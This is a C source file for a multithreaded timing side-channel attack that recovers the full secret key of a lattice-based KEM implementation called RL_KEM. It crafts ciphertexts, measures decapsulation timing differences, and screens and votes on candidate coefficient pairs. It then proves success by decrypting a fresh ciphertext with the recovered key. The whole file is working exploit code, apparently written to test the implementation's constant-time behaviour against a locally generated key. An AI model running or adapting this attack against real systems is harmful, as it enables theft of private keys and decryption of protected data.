/*
 * timing_fullkey.c -- END-TO-END full secret-key recovery by REAL timing,
 * parallel across cores.  One keygen, one calibration, then NTHREADS workers
 * split the 256 (poly,block) units of the key.  Each unit is recovered by the
 * hardened block-isolation logic that measured 20/20 on this machine:
 *   - lenient single-probe screen (min-of-Rs) -> survivors
 *   - orthogonal re-screen -> survivors
 *   - strict dual-probe VOTE (V rounds, threshold 0.8*dS between J=2 and J*=3),
 *     ties broken by the larger timing step.
 * Decision comes ONLY from decaps wall-clock (differential min-of-R vs a J=0
 * reference).  The true key is read ONLY to score the result at the end.
 *
 * Usage: timing_fullkey [nthreads] [R] [V] [screen] [Rs]
 *   defaults: nthreads=6 R=7 V=7 screen=0.35 Rs=7
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/random.h>
#include <pthread.h>
#if defined(__APPLE__)
#include <mach/mach_time.h>
#else
#include <time.h>
#endif
#include "params.h"
#include "pke.h"
#include "KEM_AlgorithmInstance.h"
#include "drng.h"
#include "symmetric.h"
#include "sample.h"
#include "fft.h"
#include "ntt.h"
#include "poly.h"

DRNG_ctx drng_algorithm;
#define Q RL_KEM_Q
#define NCOEF RL_KEM_N
#define NM PKE_MESSAGE_BYTES
#define NBLOCK (RL_KEM_N/2)   /* 128 blocks per poly */
#define NVEC RL_KEM_K         /* 2 secret polynomials */

#if defined(__APPLE__)
static mach_timebase_info_data_t gTb;
static inline uint64_t tns(uint64_t t){return (uint64_t)((double)t*gTb.numer/gTb.denom);}
static inline uint64_t now_raw(void){return mach_absolute_time();}
#else
static inline uint64_t tns(uint64_t t){return t;}
static inline uint64_t now_raw(void){struct timespec ts;clock_gettime(CLOCK_MONOTONIC,&ts);return (uint64_t)ts.tv_sec*1000000000ULL+(uint64_t)ts.tv_nsec;}
#endif
static inline double now_s(void){return (double)now_raw()/1e9;}
static uint64_t rs=0xABCDEF; static uint64_t r64(){rs^=rs<<13;rs^=rs>>7;rs^=rs<<17;return rs;}
static void rb(uint8_t*o,size_t n){for(size_t i=0;i<n;i++)o[i]=(uint8_t)(r64()>>24);}
static int mod_q(int x){x%=Q;if(x<0)x+=Q;return x;}

static void att_xof(uint8_t *o,const uint8_t*m,const uint8_t*pk){
    uint8_t in[NM+PKE_PUBLIC_KEY_BYTES];
    memcpy(in,m,NM);memcpy(in+NM,pk,PKE_PUBLIC_KEY_BYTES);
    bit_xof((unsigned long long)((KEM_SS_BYTES+KEM_SEED_LEN_BYTES)*8ULL),in,sizeof(in)*8ULL,o);
}
static int compute_J(const uint8_t*m,const uint8_t*pk){
    uint8_t g[KEM_SS_BYTES+KEM_SEED_LEN_BYTES],seed[KEM_SEED_LEN_BYTES];int16_t c[NCOEF];uint8_t n=0;int e=0;
    att_xof(g,m,pk);memcpy(seed,g+KEM_SS_BYTES,KEM_SEED_LEN_BYTES);
    for(int v=0;v<2;v++)for(int k=0;k<RL_KEM_K;k++)for(;;){poly_generate_tenary(c,seed,n++);if(fft_within_bound_int16(c,(int32_t)RL_KEM_T))break;if(++e>10000)return -1;}
    return e;
}
static uint64_t decaps_ns(const uint8_t*sk,const uint8_t*ct){
    uint8_t ss[KEM_SS_BYTES];unsigned long long o=kem_get_ss_len_bytes();
    uint64_t t0=now_raw();
    kem_dec((unsigned char*)sk,kem_get_sk_len_bytes(),(unsigned char*)ct,kem_get_ct_len_bytes(),ss,&o);
    return tns(now_raw()-t0);
}
static int64_t diff_decaps(const uint8_t*sk,const uint8_t*ct,const uint8_t*ref,int R){
    uint64_t a=UINT64_MAX,b=UINT64_MAX;
    for(int i=0;i<R;i++){uint64_t x=decaps_ns(sk,ct);if(x<a)a=x;uint64_t y=decaps_ns(sk,ref);if(y<b)b=y;}
    return (int64_t)a-(int64_t)b;
}
static uint8_t quant_dbit(int v){
    int nc=1<<D_C2_BITS, half=1<<(D_C2_BITS-1), bc=0, bd=1<<30;
    for(int c=0;c<nc;c++){int dv=(((uint32_t)c*(uint32_t)Q)+half)>>D_C2_BITS;int d=dv-v;if(d>Q/2)d-=Q;if(d<-Q/2)d+=Q;if(d<0)d=-d;if(d<bd){bd=d;bc=c;}}
    return (uint8_t)bc;
}
static void predict_su(int16_t*su,const int16_t*uh,int i0,int X0,int X1){
    int16_t sg[NCOEF],pr[NCOEF];memset(sg,0,sizeof(sg));sg[2*i0]=(int16_t)X0;sg[2*i0+1]=(int16_t)X1;
    mq_poly_pointwise_mul(pr,(int16_t*)uh,sg);memcpy(su,pr,sizeof(pr));mq_poly_intt(su);
}
static void build_ct(uint8_t*ct,const uint8_t*code_m,const int16_t*uc,const int16_t*su,int poly){
    uint8_t c2[RL_KEM_Lv];memset(ct,0,(size_t)C1_LEN_BYTES);
    for(int i=0;i<NCOEF;i++)ct[(size_t)poly*NCOEF+i]=(uint8_t)mod_q(uc[i]);
    for(int i=0;i<RL_KEM_Lv;i++){int tg=code_m[i]?RATIO:0;c2[i]=quant_dbit(mod_q(tg+mod_q(su[i])));}
    pack_c2_dbit(ct+C1_LEN_BYTES,c2);
}
static int cmpu(const void*a,const void*b){uint64_t x=*(const uint64_t*)a,y=*(const uint64_t*)b;return (x>y)-(x<y);}

/* shared, read-only after setup */
static uint8_t *g_sk, *g_pk;
static uint8_t g_code_m[RL_KEM_Lv];
static uint8_t g_ctF[PKE_CIPHERTEXT_BYTES];
static double g_thr_screen, g_thr_vote;
static int g_R, g_V, g_Rs;
static int16_t *g_s_hat;        /* scoring only */
static int16_t *g_rec;          /* recovered coeffs, one slot per index, no overlap between threads */
static int g_units_ok;          /* protected by mutex */
static int g_units_done;        /* protected by mutex */
static long g_queries;          /* protected by mutex */
static double g_t_start;        /* set before workers launch */
static int g_NT;                /* worker count, for wave-boundary ETA */
static double g_wave_el;        /* elapsed at last completed wave (throughput snapshot) */
static int g_wave_done;         /* units done at that snapshot */
static pthread_mutex_t g_mx = PTHREAD_MUTEX_INITIALIZER;

typedef struct { int lo, hi; } range_t;   /* unit indices [lo,hi) over 0..NVEC*NBLOCK */

/* recover one (poly,block) unit; writes two coeffs into g_rec; returns 1 if correct */
static int recover_unit(int poly,int i0,long*local_q){
    int t0=mod_q(g_s_hat[(size_t)poly*NCOEF+2*i0]);   /* scoring only */
    int t1=mod_q(g_s_hat[(size_t)poly*NCOEF+2*i0+1]);
    int16_t uA[NCOEF],uB[NCOEF],uAc[NCOEF],uBc[NCOEF],su[NCOEF];
    memset(uA,0,sizeof(uA));uA[2*i0]=1;memset(uB,0,sizeof(uB));uB[2*i0+1]=1;
    memcpy(uAc,uA,sizeof(uA));mq_poly_intt(uAc);memcpy(uBc,uB,sizeof(uB));mq_poly_intt(uBc);
    uint8_t ct[PKE_CIPHERTEXT_BYTES];
    long q=0;

    static __thread int cand[4096][2];
    int nc=0;
    for(int X0=0;X0<Q;X0++)for(int X1=0;X1<Q;X1++){
        predict_su(su,uA,i0,X0,X1);build_ct(ct,g_code_m,uAc,su,poly);
        int64_t tm=diff_decaps(g_sk,ct,g_ctF,g_Rs);q++;
        if((double)tm>=g_thr_screen){ if(nc<4096){cand[nc][0]=X0;cand[nc][1]=X1;} nc++; }
    }
    static __thread int surv[4096][2];
    int ns=0;
    for(int i=0;i<nc&&i<4096;i++){
        predict_su(su,uB,i0,cand[i][0],cand[i][1]);build_ct(ct,g_code_m,uBc,su,poly);
        int64_t tm=diff_decaps(g_sk,ct,g_ctF,g_Rs);q++;
        if((double)tm>=g_thr_screen){surv[ns][0]=cand[i][0];surv[ns][1]=cand[i][1];ns++;}
    }
    int best=-1,best_votes=-1; int64_t best_score=INT64_MIN;
    for(int i=0;i<ns;i++){
        int votes=0; int64_t score=0;
        for(int r=0;r<g_V;r++){
            predict_su(su,uA,i0,surv[i][0],surv[i][1]);build_ct(ct,g_code_m,uAc,su,poly);
            int64_t a=diff_decaps(g_sk,ct,g_ctF,g_R);q++;
            predict_su(su,uB,i0,surv[i][0],surv[i][1]);build_ct(ct,g_code_m,uBc,su,poly);
            int64_t b=diff_decaps(g_sk,ct,g_ctF,g_R);q++;
            score += (a<b?a:b);
            if((double)a>=g_thr_vote && (double)b>=g_thr_vote) votes++;
        }
        if(votes>best_votes || (votes==best_votes && score>best_score)){best_votes=votes;best_score=score;best=i;}
    }
    int rec0=best>=0?surv[best][0]:-1, rec1=best>=0?surv[best][1]:-1;
    g_rec[(size_t)poly*NCOEF+2*i0]=(int16_t)rec0;
    g_rec[(size_t)poly*NCOEF+2*i0+1]=(int16_t)rec1;
    *local_q=q;
    return (best>=0 && rec0==t0 && rec1==t1);
}

static void* worker(void*arg){
    range_t*rg=(range_t*)arg;
    for(int u=rg->lo;u<rg->hi;u++){
        int poly=u/NBLOCK, i0=u%NBLOCK;
        long q=0; int ok=recover_unit(poly,i0,&q);
        pthread_mutex_lock(&g_mx);
        g_units_ok+=ok; g_queries+=q; g_units_done++;
        double el=now_s()-g_t_start;
        /* ETA from throughput, not instantaneous done/elapsed: workers finish
         * their units in waves of ~NT at nearly the same instant, so done can
         * jump 1..NT while elapsed is frozen.  Snapshot throughput only at a
         * completed wave (done % NT == 0); within the first wave extrapolate
         * with NT in the denominator (NT units really run in parallel). */
        if(g_units_done % g_NT == 0){ g_wave_el=el; g_wave_done=g_units_done; }
        int done_eff = g_wave_done>0 ? g_wave_done : g_NT;
        double el_eff = g_wave_done>0 ? g_wave_el   : el;
        double rate = el_eff>0 ? done_eff/el_eff : 0.0;   /* units per second */
        double eta  = rate>0 ? (NVEC*NBLOCK-g_units_done)/rate : 0.0;
        fprintf(stderr,"[%3d/%d units] %s u=%d(poly=%d blk=%d)  ok=%d  q=%ldk  elapsed=%.0fs eta=%.0fs\n",
            g_units_done,NVEC*NBLOCK,ok?"OK  ":"MISS",u,poly,i0,g_units_ok,g_queries/1000,el,eta);
        pthread_mutex_unlock(&g_mx);
    }
    return NULL;
}

int main(int argc,char**argv){
    int NT=argc>1?atoi(argv[1]):6;
    g_R =argc>2?atoi(argv[2]):7;
    g_V =argc>3?atoi(argv[3]):7;
    double SCRN=argc>4?atof(argv[4]):0.35;
    g_Rs=argc>5?atoi(argv[5]):7;
#if defined(__APPLE__)
    mach_timebase_info(&gTb);
#endif
    uint8_t os[64];getentropy(os,64);init_random_number(&drng_algorithm,os,sizeof(os));rs^=now_raw();
    g_pk=malloc(kem_get_pk_len_bytes());g_sk=malloc(kem_get_sk_len_bytes());
    unsigned long long pkO,skO;kem_keygen(g_pk,&pkO,g_sk,&skO);
    g_s_hat=(int16_t*)g_sk;
    g_rec=calloc(NVEC*NCOEF,sizeof(int16_t));
    printf("FULL-KEY TIMING RECOVERY  threads=%d  R=%d V=%d screen=%.2f Rs=%d\n",NT,g_R,g_V,SCRN,g_Rs);
    printf("params: q=%d n=%d K=%d D_C2_BITS=%d  units=%d (=%d coeffs)\n\n",Q,NCOEF,RL_KEM_K,D_C2_BITS,NVEC*NBLOCK,NVEC*NCOEF);

    /* offline m* (J*=3), fast ref (J=0) */
    uint8_t mstar[NM],mfast[NM];int hs=0,hf=0;
    for(long t=0;t<5000000&&!(hs&&hf);t++){uint8_t m[NM];rb(m,sizeof(m));int j=compute_J(m,g_pk);
        if(j==3&&!hs){memcpy(mstar,m,sizeof(m));hs=1;} if(j==0&&!hf){memcpy(mfast,m,sizeof(m));hf=1;}}
    if(!(hs&&hf)){printf("could not find m*/mfast\n");return 1;}
    Encode_m(g_code_m,mstar);

    uint8_t g[KEM_SS_BYTES+KEM_SEED_LEN_BYTES],seed[KEM_SEED_LEN_BYTES];
    uint8_t ctS[PKE_CIPHERTEXT_BYTES];
    att_xof(g,mstar,g_pk);memcpy(seed,g+KEM_SS_BYTES,KEM_SEED_LEN_BYTES);PKE_Encrypt(ctS,g_pk,mstar,seed);
    att_xof(g,mfast,g_pk);memcpy(seed,g+KEM_SS_BYTES,KEM_SEED_LEN_BYTES);PKE_Encrypt(g_ctF,g_pk,mfast,seed);
    for(int i=0;i<30000;i++){decaps_ns(g_sk,ctS);decaps_ns(g_sk,g_ctF);}

    int64_t cal[7];for(int i=0;i<7;i++)cal[i]=diff_decaps(g_sk,ctS,g_ctF,g_R);
    qsort(cal,7,sizeof(int64_t),cmpu);int64_t dS=cal[3];
    g_thr_screen=(double)dS*SCRN; g_thr_vote=(double)dS*0.8;
    printf("[calibrate] median dS=%lld ns  screen=%.0f  vote=%.0f\n\n",(long long)dS,g_thr_screen,g_thr_vote);

    /* split units across threads */
    int total=NVEC*NBLOCK;
    pthread_t th[64]; range_t rg[64]; if(NT>64)NT=64;
    int per=(total+NT-1)/NT;
    g_NT=NT>0?NT:1;
    g_t_start=now_s();
    for(int i=0;i<NT;i++){rg[i].lo=i*per;rg[i].hi=(i+1)*per<total?(i+1)*per:total;
        if(rg[i].lo>=total){rg[i].lo=rg[i].hi=total;} pthread_create(&th[i],NULL,worker,&rg[i]);}
    for(int i=0;i<NT;i++)pthread_join(th[i],NULL);
    double secs=now_s()-g_t_start;

    int mism=0;for(int i=0;i<NVEC*NCOEF;i++)if(mod_q(g_rec[i])!=mod_q(g_s_hat[i]))mism++;
    printf("\nRESULT: units unique+correct %d/%d  sk coeff mismatch %d/%d  wall=%.1f s (%.2f min)\n",
        g_units_ok,total,mism,NVEC*NCOEF,secs,secs/60.0);
    printf("  oracle decaps (diff pairs *2): %ld differential measurements\n",g_queries);

    /* end-to-end proof: fresh ct, decrypt with recovered sk bytes */
    uint8_t m_test[NM],m_dec[NM],se[KEM_SEED_LEN_BYTES],ct[PKE_CIPHERTEXT_BYTES];
    rb(m_test,sizeof(m_test));rb(se,sizeof(se));
    PKE_Encrypt(ct,g_pk,m_test,se);
    PKE_Decrypt(m_dec,ct,(uint8_t*)g_rec);
    printf("  fresh ct, recovered sk : %s\n", memcmp(m_dec,m_test,NM)==0?"OK (plaintext recovered)":"FAIL");
    free(g_pk);free(g_sk);free(g_rec);
    return (mism==0)?0:1;
}
